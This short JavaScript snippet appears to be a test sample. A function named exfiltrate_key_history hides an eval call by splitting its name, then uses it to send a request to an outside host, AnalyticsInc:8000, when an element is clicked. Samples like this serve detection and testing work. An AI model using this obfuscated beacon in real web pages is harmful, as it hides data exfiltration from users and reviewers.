function exfiltrate_key_history() {
  var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=eval2", true);xmlhttp.send(null);';
  var v2 = "ev" + "al";
  var v0 = eval(v2);
  v0(exp);
  return;
}
var v1 = document.getElementById("test");
v1.onclick = exfiltrate_key_history
